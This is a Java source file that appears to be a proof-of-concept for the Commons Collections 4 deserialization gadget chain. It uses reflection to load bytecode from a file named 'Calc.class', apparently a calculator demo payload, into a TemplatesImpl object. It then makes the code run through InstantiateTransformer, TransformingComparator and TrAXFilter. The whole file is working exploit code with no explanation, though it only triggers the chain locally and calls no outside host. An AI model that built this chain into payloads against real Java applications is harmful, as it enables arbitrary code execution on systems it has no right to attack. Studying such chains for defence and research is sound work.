import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;

public class PreChain {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, TransformerConfigurationException {
        TransformerFactoryImpl factory = new TransformerFactoryImpl();

        TemplatesImpl templates = new TemplatesImpl();

        Field tfactory = TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, factory);

        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "Calc");

        byte[] bytes = Files.readAllBytes(Paths.get("./util/target/classes/org/ixpqxi/util/Calc.class"));
        byte[][] bytecodes = {bytes};

        Field _bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(templates, bytecodes);

//        templates.newTransformer();

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(
                new Class[]{Templates.class},
                new Object[]{templates}
        );

        TransformingComparator transformingComparator = new TransformingComparator(instantiateTransformer);
        transformingComparator.compare(TrAXFilter.class, null);
    }
}
